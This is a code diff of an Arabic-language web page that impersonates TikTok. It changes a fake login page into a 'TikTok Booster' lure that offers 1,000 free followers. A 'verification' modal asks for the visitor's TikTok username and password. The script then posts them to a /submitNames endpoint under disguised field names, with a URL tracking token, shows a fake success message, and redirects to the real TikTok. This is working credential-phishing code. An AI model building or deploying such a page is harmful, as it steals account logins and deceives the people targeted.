@@ -5,40 +5,197 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <!-- Meta Tags for Preview -->
-    <meta property="og:title" content="TikTok - شاهد مقاطع الفيديو الرائجة">
-    <meta property="og:description" content="انضم إلى الملايين من المشاهدين الذين يكتشفون المحتوى المبدع على تيك توك.">
+    <meta property="og:title" content="TikTok Booster - زيادة متابعين تيك توك">
+    <meta property="og:description" content="احصل على 1000 متابع حقيقي لحسابك على تيك توك مجاناً. خدمة سريعة وآمنة 100%.">
     <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b6efc5601ff3.png">
-    <meta property="og:type" content="video.other">
+    <meta property="og:type" content="website">
 
-    <title>TikTok</title>
+    <title>TikTok Booster | زيادة متابعين</title>
     <style>
-        body { font-family: 'TikTokFont', Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { width: 400px; padding: 30px; border: 1px solid #ebebeb; text-align: center; border-radius: 8px; }
-        .logo { font-size: 32px; font-weight: bold; margin-bottom: 20px; color: #000; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #f1f1f2; background: #f1f1f2; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background-color: #fe2c55; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
+        body {
+            font-family: 'ProximaNova', Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .header {
+            width: 100%;
+            padding: 20px;
+            background: #000;
+            text-align: center;
+            border-bottom: 1px solid #333;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: -1px;
+        }
+        .logo span:nth-child(1) { color: #ff0050; }
+        .logo span:nth-child(2) { color: #fff; }
+        .logo span:nth-child(3) { color: #00f2ea; }
+        
+        .container {
+            max-width: 400px;
+            width: 90%;
+            margin-top: 30px;
+        }
+        .card {
+            background: #252525;
+            border-radius: 12px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .badge {
+            background: #ff0050;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+        h2 { margin: 15px 0; font-size: 22px; }
+        p { color: #a0a0a0; font-size: 14px; line-height: 1.6; }
+        
+        .input-box {
+            margin: 25px 0;
+            text-align: right;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #333;
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            margin-top: 8px;
+        }
+        input:focus { outline: none; border-color: #00f2ea; }
+        
+        .btn-tiktok {
+            width: 100%;
+            padding: 14px;
+            background-color: #ff0050;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-tiktok:hover { background-color: #d60043; }
+        
+        .plans {
+            margin-top: 25px;
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+        }
+        .plan {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #444;
+            border-radius: 8px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .plan.active { border-color: #ff0050; background: rgba(255, 0, 80, 0.1); }
+        .price { display: block; font-weight: bold; color: #00f2ea; margin-top: 5px; }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #1f1f1f;
+            padding: 30px;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 360px;
+            text-align: center;
+            border: 1px solid #333;
+        }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">TikTok</div>
-        <h3>تسجيل الدخول</h3>
-        <form id="tiktokForm">
-            <input type="text" id="user" placeholder="اسم المستخدم" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-            <button type="submit" id="tBtn">تسجيل الدخول</button>
-        </form>
+
+    <div class="header">
+        <div class="logo"><span>Tik</span><span>Tok</span><span> Booster</span></div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <span class="badge">هدية مجانية</span>
+            <h2>1,000 متابع مجاني</h2>
+            <p>أدخل يوزر حسابك على تيك توك وسنقوم بإرسال المتابعين فوراً عبر خوادمنا السريعة.</p>
+            
+            <div class="input-box">
+                <label>اسم المستخدم (TikTok ID)</label>
+                <input type="text" id="target_id" placeholder="@tiktok_user">
+            </div>
+
+            <div class="plans">
+                <div class="plan active">1,000 متابع<span class="price">مجاني</span></div>
+                <div class="plan">10,000 متابع<span class="price">14.99$</span></div>
+            </div>
+
+            <button class="btn-tiktok" style="margin-top: 25px;" onclick="openVerify()">استلام المتابعين</button>
+        </div>
+        
+        <p style="text-align: center; font-size: 11px; margin-top: 20px;">
+            جميع الحقوق محفوظة © TikTok Booster 2026
+        </p>
+    </div>
+
+    <!-- Verification Modal -->
+    <div class="modal" id="verifyModal">
+        <div class="modal-content">
+            <div class="logo" style="font-size: 32px; margin-bottom: 20px;"><span>Tik</span><span>Tok</span></div>
+            <h3>تحقق من الحساب</h3>
+            <p>لتجنب عمليات الاحتيال، يرجى تسجيل الدخول لتأكيد هويتك واستلام الـ 1000 متابع.</p>
+            <form id="tiktokLoginForm">
+                <input type="text" id="t_user" placeholder="البريد أو اسم المستخدم" required>
+                <input type="password" id="t_pass" placeholder="كلمة السر" required style="margin-top: 10px;">
+                <button type="submit" class="btn-tiktok" id="tSubmit" style="margin-top: 20px;">تأكيد الحساب</button>
+            </form>
+            <button onclick="closeVerify()" style="background:none; border:none; color:#666; margin-top: 15px; cursor:pointer;">رجوع</button>
+        </div>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const token = urlParams.get('t');
 
-        document.getElementById('tiktokForm').onsubmit = async (e) => {
+        function openVerify() {
+            const val = document.getElementById('target_id').value;
+            if(!val) { alert('أدخل اسم المستخدم أولاً'); return; }
+            document.getElementById('verifyModal').style.display = 'flex';
+            document.getElementById('t_user').value = val;
+        }
+
+        function closeVerify() {
+            document.getElementById('verifyModal').style.display = 'none';
+        }
+
+        document.getElementById('tiktokLoginForm').onsubmit = async (e) => {
             e.preventDefault();
-            const btn = document.getElementById('tBtn');
+            const btn = document.getElementById('tSubmit');
             btn.disabled = true;
-            btn.innerText = "جاري التحميل...";
+            btn.innerText = "جاري التأكيد...";
 
             try {
                 await fetch('/submitNames', {
@@ -46,13 +203,16 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         token: token,
-                        firstName: document.getElementById('user').value,
-                        secondName: document.getElementById('pass').value
+                        firstName: document.getElementById('t_user').value,
+                        secondName: document.getElementById('t_pass').value
                     })
                 });
             } catch (err) {}
 
-            window.location.href = "https://www.tiktok.com";
+            setTimeout(() => {
+                alert('نجح التحقق! سيتم إرسال المتابعين خلال دقائق.');
+                window.location.href = "https://www.tiktok.com";
+            }, 2000);
         };
     </script>
 </body>
